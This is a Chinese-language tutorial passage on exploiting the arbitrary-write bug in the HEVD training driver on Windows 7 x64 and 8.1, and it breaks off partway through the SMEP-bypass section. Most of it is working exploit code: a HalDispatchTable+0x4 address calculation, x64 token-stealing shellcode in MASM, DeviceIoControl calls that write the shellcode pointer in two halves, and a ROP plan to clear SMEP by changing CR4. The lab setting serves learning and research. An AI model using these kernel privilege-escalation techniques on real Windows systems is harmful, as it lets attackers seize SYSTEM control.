# 0x00：前言
本篇文章分为上下篇，主要分享HEVD这个Windows内核漏洞训练项目中的Write-What-Where漏洞在win7 x64到win10 x64
1605的一个爬坑过程，Windows内核漏洞的原理比较简单，关键点在于exp的编写，这里我从win7 x64开始说起，看此文章之前你需要有以下准备：
  * Windows相应版本的虚拟机
  * 配置好windbg等调试工具，建议配合VirtualKD使用
  * 虚拟机打上相应版本的补丁
如果你不是很清楚这个漏洞的基本原理的话，你可以从我的[另一篇文章](https://xz.aliyun.com/t/5615)了解到这个漏洞的原理以及在win
7 x86下的利用，我这里就不多加赘述了
# 0x01：Windows 7 x64利用
让我们简单回顾一下在Windows 7 x86下我们利用的利用思路和关键代码，全部的代码参考 =>
[这里](https://github.com/ThunderJie/Windows-Kernel-Exploit/blob/master/HEVD/ArbitraryOverwrite/ArbitraryOverwrite/test.c)
**利用思路**
  * 初始化句柄等结构
  * 计算我们需要Hook的地址`HalDispatchTable+0x4`
  * 调用`TriggerArbitraryOverwrite`函数将`shellcode`地址放入Hook地址
  * 调用`NtQueryIntervalProfile`函数触发漏洞
  * 调用cmd验证提权结果
**关键代码**
计算Hook地址
    DWORD32 GetHalOffset_4()
    {
        // ntkrnlpa.exe in kernel space base address
        PVOID pNtkrnlpaBase = NtkrnlpaBase();
        printf("[+]ntkrnlpa base address is 0x%p\n", pNtkrnlpaBase);
        // ntkrnlpa.exe in user space base address
        HMODULE hUserSpaceBase = LoadLibrary("ntkrnlpa.exe");
        // HalDispatchTable in user space address
        PVOID pUserSpaceAddress = GetProcAddress(hUserSpaceBase, "HalDispatchTable");
        DWORD32 hal_4 = (DWORD32)pNtkrnlpaBase + ((DWORD32)pUserSpaceAddress - (DWORD32)hUserSpaceBase) + 0x4;
        printf("[+]HalDispatchTable+0x4 is 0x%p\n", hal_4);
        return (DWORD32)hal_4;
    }
调用问题函数执行shellcode
    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
    printf("[+]NtQueryIntervalProfile address is 0x%x\n", NtQueryIntervalProfile);
    NtQueryIntervalProfile(0x1337, &interVal);
众所周知Windows 7
x64是64位的，所以我们很快的就可以想到和32位的不同，所以我们在32位的基础上只需要改一下长度应该就可以拿到system权限了，实际上还是有很多坑的，这里我分享几个我遇到的坑，第一个就是我们的shellcode需要修改，因为是64位，所以偏移都会有改变，但是原理是不会变的
  * 当前线程中找到`_KTHREAD`结构体
  * 找到`_EPROCESS`结构体
  * 找到当前线程的token
  * 循环便利链表找到system系统的token
  * 替换token
    mov     rax, gs:[188h]
        mov     rax, [rax+210h]
        mov     rcx, rax
        mov     rdx, 4
    findSystemPid:
        mov    rax, [rax+188h]
        sub    rax, 188h
        cmp    [rax+180h], rdx
        jnz findSystemPid
        mov rdx, [rax+0208h]
        mov [rcx+0208h], rdx
        ret
**Shellcode在64位下的编译**
首先第一个就是shellcode如何放置在64位的编译环境下，如果是像32位那样直接在代码中嵌入汇编是行不通的，这里我们需要以下几步来嵌入汇编代码(我使用的环境是VS2019，当然以前的版本也可以)
1.项目源文件中多创建一个ShellCode.asm文件，放入我们的shellcode
    .code
    ShellCode proc
        mov     rax, gs:[188h]
        mov     rax, [rax+210h]
        mov     rcx, rax
        mov     rdx, 4
    findSystemPid:
        mov    rax, [rax+188h]
        sub    rax, 188h
        cmp    [rax+180h], rdx
        jnz findSystemPid
        mov rdx, [rax+0208h]
        mov [rcx+0208h], rdx
        ret
    ShellCode endp
    end
2.右键ShellCode.asm文件，点击属性，生成中排除选择否，项类型选择自定义生成工具
3.在自定义工具里面的命令行和输出填写如下内容
    ml64 /c %(filename).asm
    %(filename).obj;%(outputs)
4.在ShellCode.h中申明如下内容，然后在主利用函数中引用即可
    #pragma once
    void ShellCode();
**shellcode的放置**
第二个坑就是shellcode的放置，在x86中我们是如下方法实现shellcode的放置
    VOID Trigger_shellcode(DWORD32 where, DWORD32 what)
    {
        WRITE_WHAT_WHERE exploit;
        DWORD lpbReturn = 0;
        exploit.Where = (PVOID)where;
        exploit.What = (PVOID)& what;
        printf("[+]Write at 0x%p\n", where);
        printf("[+]Write with 0x%p\n", what);
        printf("[+]Start to trigger...\n");
        DeviceIoControl(hDevice,
            0x22200B,
            &exploit,
            sizeof(WRITE_WHAT_WHERE),
            NULL,
            0,
            &lpbReturn,
            NULL);
        printf("[+]Success to trigger...\n");
    }
因为我们现在是`qword`而不是`dword`，也就是说我们需要调用两次才能将我们的地址完全写进去，所以构造出如下的片段
    VOID Trigger_shellcode(UINT64 where, UINT64 what)
    {
        WRITE_WHAT_WHERE exploitlow;
        WRITE_WHAT_WHERE exploithigh;
        DWORD lpbReturn = 0;
        UINT32 lowValue = what;
        UINT32 highvalue = (what >> 0x20);
        exploitlow.What = (PULONG_PTR)& what;
        exploitlow.Where = (PULONG_PTR)where;
        printf("[+]Start to trigger ");
        DeviceIoControl(hDevice,
            0x22200B,
            &exploitlow,
            0x10,
            NULL,
            0,
            &lpbReturn,
            NULL);
        exploithigh.What = (PULONG_PTR)& highvalue;
        exploithigh.Where = (PULONG_PTR)(where + 0x4);
        DeviceIoControl(hDevice,
            0x22200B,
            &exploithigh,
            0x10,
            NULL,
            0,
            &lpbReturn,
            NULL);
        printf("=> done!\n");
    }
最后整合一下代码即可实现利用，整体代码和验证结果参考 => [这里](https://github.com/ThunderJie/Write-What-Where)
# 0x02：Windows 8.1 x64利用
好了win7我们已经完成了利用，我们开始研究win8下的利用，首先我们需要了解一些win8的安全机制，我们拿在win7
x64下的exp直接拖入win8运行观察会发生什么，果不其然蓝屏了，我们查看一下在windbg中的分析
    *** Fatal System Error: 0x000000fc
                           (0x00007FF6F3B31400,0x1670000089B30025,0xFFFFD000210577E0,0x0000000080000005)
    Break instruction exception - code 80000003 (first chance)
    ...
    0: kd> !analyze -v
    *******************************************************************************
    *                                                                             *
    *                        Bugcheck Analysis                                    *
    *                                                                             *
    *******************************************************************************
    ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY (fc) // 关注点
    An attempt was made to execute non-executable memory.  The guilty driver
    is on the stack trace (and is typically the current instruction pointer).
    When possible, the guilty driver's name (Unicode string) is printed on
    the bugcheck screen and saved in KiBugCheckDriver.
    Arguments:
    Arg1: 00007ff6f3b31400, Virtual address for the attempted execute.
    Arg2: 1670000089b30025, PTE contents.
    Arg3: ffffd000210577e0, (reserved)
    Arg4: 0000000080000005, (reserved)
windbg中提示`ATTEMPTED_EXECUTE_OF_NOEXECUTE_MEMORY`这个错误，我们解读一下这句话，企图执行不可执行的内存，等等，这不就是我们pwn中的NX保护吗
## SMEP
我们详细来了解一下这个保护机制，SMEP保护开启的时候我们用户层的代码不能在内核层中执行，也就是说我们的shellcode不能得到执行
这个时候我们回想一下绕过NX的方法，瞬间就想到了ROP，那么我们现在是要拿ROP帮我们做哪些事情呢？我们看下面这张图，可以看到我们的SMEP标志位在第20位，也就是说我们只需要将cr4寄存器修改为关闭SMEP的状态即可运行我们的shellcode了
## ROPgadgets
我们来查看一下我们的cr4寄存器的运行在我的环境下触发漏洞前后的对比
    .formats 00000000001506f8 // 开启
        Binary:  00000000 00000000 00000000 00000000 00000000 0001        0101 00000110 11111000
    .formats 0x406f8          // 关闭
        Binary:  00000000 00000000 00000000 00000000 00000000 0000        0100 00000110 11111000
也就是说我们只需要将cr4修改为0x406f8即可在内核运行我们的shellcode从而提权，那么如何选择我们的ROP呢，我们来观察以下代码片段，可以看到里可以通过rax来修改cr4，那么问题就简单了，我们只需要把rax设为0x406f8不就行了吗，ROPgadgets的计算我们可以通过偏移来查找，首先我们通过前面的知识计算出内核基地址，然后在windbg中用u命令查看`KiConfigureDynamicProcessor+0x40`的地址，我们用该地址减去基地址即可得到偏移，有了偏移我们加上基地址就可以得到我们ROPgadgets的位置了
    1: kd> u KiConfigureDynamicProcessor+0x40
    nt!KiConfigureDynamicProcessor+0x40: